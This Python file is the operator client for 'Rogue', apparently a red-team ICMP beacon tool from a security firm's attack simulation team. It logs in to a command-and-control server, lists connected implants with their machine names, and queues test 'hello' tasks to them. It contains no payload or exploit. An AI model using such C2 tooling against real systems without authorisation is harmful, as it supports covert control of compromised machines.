##
## ROGUE
##
## GuidePoint Security LLC
##
## Threat and Attack Simulation Team
##
import base64
import argparse

##
## Library
##
from lib import midna
from lib import logging
from lib import tasking

##
## Create argument
##
if __name__ in '__main__':
    opts = argparse.ArgumentParser( description = 'Rogue: minimal ICMP beacon client.' );
    opts.add_argument( '-u', '--username', help = 'Username to use when connecting to midna. ( e.g. username@hostname ) ', required = False, default = 'user@midna.local', type = str );
    opts.add_argument( '-p', '--password', help = 'Password to use when connecting to midna. ( e.g. password ) ', required = False, default = 'password', type = str );
    opts.add_argument( '-i', '--interact', help = 'GUID of the agent to interact with.', required = False, default = '', type = str );
    cmds = opts.add_subparsers( help = 'client commands.', dest = 'subcommand', required = True );
    cmds.add_parser( 'hello', help = 'Tasks the agent to send back a hello packet.' );
    cmds.add_parser( 'list', help = 'Prints a list of agents that are connected.' );
    args = opts.parse_args();

    ##
    ## Connect to midna
    ## 
    try:
        Web = midna.Midna( args.username, args.password );
        Web.get_auth();
    except:
        logging.error( 'could not establish a connection with midna.' );
        raise SystemExit;

    ##
    ## "list"
    ##
    if args.subcommand == 'list':
        ##
        ## Get the list of targets
        ##
        Tgt = Web.get_targets();

        for Client in Tgt:
            ##
            ## Print the list of clients
            ##
            if Client['software_id'] == 4:
                logging.success( 'GUID: {} ANSI ID: {} ID: {} Name: {} Arch: {}'.format( Client['guid'], Client['implant_id'], Client['id'], Client['machine_name'], Client['architecture'] ) );

    ##
    ## "hello"
    ##
    if args.subcommand == 'hello':
        ##
        ## Create "hello" task
        ##
        Buf = tasking.TaskingRequest( tasking.COMMAND_HELLO, 0, '' );

        ##
        ## Get the target
        ##
        Tgt = Web.get_targets();

        ##
        ## Was a client name providied
        ##
        if args.interact != '':
            ##
            ## Locate the client in the target list.
            ##
            for Client in Tgt:
                ##
                ## Found
                ##
                if Client['implant_id'] == args.interact:
                    ##
                    ## Create the task.
                    ##
                    logging.success( 'Sending task to the client' );

                    Jsn = {
                            "code": tasking.COMMAND_HELLO,
                            "target_id": Client['id'],
                            "args": { "buffer": "test" }
                    }

                    #Tsk = Web.new_task( Jsn );

                    #print( Tsk );

                    print( Web.get_tasks() );
                    break;
        else:
            logging.error( 'please provide an id to interact with.' );
